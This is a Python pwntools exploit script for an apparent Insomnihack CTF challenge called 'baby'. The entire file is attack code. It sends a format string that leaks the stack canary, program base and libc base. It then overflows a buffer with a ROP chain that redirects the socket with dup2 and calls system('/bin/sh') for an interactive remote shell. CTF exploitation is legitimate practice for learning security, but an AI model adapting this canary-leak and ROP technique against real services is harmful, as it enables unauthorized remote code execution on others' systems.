from pwn import *
import time

local = False
if local:
	HOST, PORT = '0.0.0.0', 1337
	delta = 0x20830
else:
	HOST, PORT = 'baby.teaser.insomnihack.ch', 1337
	delta = 0x20830
r = remote(HOST, PORT)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

menu = lambda: r.recvuntil(' > ')
i = lambda x: r.sendline(str(x))

menu()
i(2)
menu()
r.sendline('%138$p %140$p %158$p')
r.recvuntil('0x')
canary = int(r.recvuntil(' '),16)
r.recvuntil('0x')
base = int(r.recvuntil(' '), 16) - 0x19cf
r.recvuntil('0x')
libc.address = int(r.recvline(), 16) - delta
print hex(canary)
print hex(base)
print hex(libc.address)

r.sendline('')
time.sleep(1)
i(1)
send = 0xe50
rdi = lambda x: p64(base + 0x1c8b) + p64(x)
rsi = lambda x: p64(base + 0x1c89) + p64(x) + p64(0)
system = libc.symbols['system']
dup2 = libc.symbols['dup2']
binsh = list(libc.search('/bin/sh'))[0]
print hex(system)
payload = 'a' * 1032 + p64(canary) + p64(0) + rdi(4) + rsi(0) + p64(dup2) + rdi(binsh) + p64(system)
r.sendline(str(len(payload)))
raw_input('>> ')
r.send(payload)

r.interactive()